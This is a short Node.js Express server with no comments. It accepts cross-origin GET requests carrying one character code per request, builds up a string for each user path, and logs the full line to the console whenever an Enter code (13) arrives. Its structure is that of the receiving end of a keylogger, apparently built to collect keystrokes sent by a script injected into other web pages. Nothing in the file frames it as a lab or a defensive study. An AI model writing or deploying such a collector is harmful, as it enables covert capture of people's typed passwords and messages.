"use strict";

const express = require("express");
const app = express();

const userMap = new Map();

app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    next();
  });

app.get('/:user', (req, res) => {
    if (req.query.l != 13) {
        if (!userMap.get(req.params.user)) {
            userMap.set(req.params.user, "");
        }
        userMap.set(req.params.user, userMap.get(req.params.user) + String.fromCharCode(req.query.l));
    } else {
        console.log(req.params.user + " -> " + userMap.get(req.params.user));
        userMap.set(req.params.user, "");
    }
    res.send("");
});

app.listen("8080");